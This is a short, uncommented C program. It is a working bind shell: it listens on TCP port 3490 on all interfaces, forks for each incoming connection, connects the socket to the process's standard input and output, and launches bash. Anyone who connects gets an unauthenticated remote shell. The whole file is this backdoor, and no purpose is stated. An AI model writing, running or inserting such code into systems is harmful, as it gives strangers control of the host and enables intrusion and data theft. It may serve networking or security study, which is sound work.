#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>

int main()
{
    struct addrinfo hints;
    struct addrinfo *servinfo;
    int status;

    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    status = getaddrinfo(NULL, "3490", &hints, &servinfo);
    if (status != 0)
    {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        exit(1);
    }

    struct pollfd sfds[256];
    int nsfds = 0;

    for (struct addrinfo *addr = servinfo; addr != NULL; addr = addr->ai_next)
    {
        int sockfd = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);

        if (sockfd == -1)
            continue;

        if (bind(sockfd, addr->ai_addr, addr->ai_addrlen) == -1)
        {
            close(sockfd);
            continue;
        }

        int yes = 1;
        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) < 0)
        {
            close(sockfd);
            continue;
        }

        if (listen(sockfd, 5) < 0)
        {
            close(sockfd);
            continue;
        }

        sfds[nsfds].fd = sockfd;
        sfds[nsfds].events = POLLIN | POLLPRI;
        nsfds++;
    }

    fprintf(stdout, "count: %d\n", nsfds);

    freeaddrinfo(servinfo);

    while (poll(sfds, nsfds, 500) != -1)
    {
        for (int i = 0; i < nsfds; i++)
        {
            if (sfds[i].revents & POLLIN)
            {
                int cfd = accept(sfds[i].fd, NULL, NULL);
                if (cfd == -1)
                    continue;

                int pid = fork();
                if (pid == 0)
                {
                    close(sfds[i].fd);
                    dup2(cfd, 0);
                    dup2(cfd, 1);
                    dup2(cfd, 2);
                    close(cfd);
                    execlp("bash", "bash", NULL);
                    exit(0);
                }
                
                close(cfd);
            }
        }
    }
}






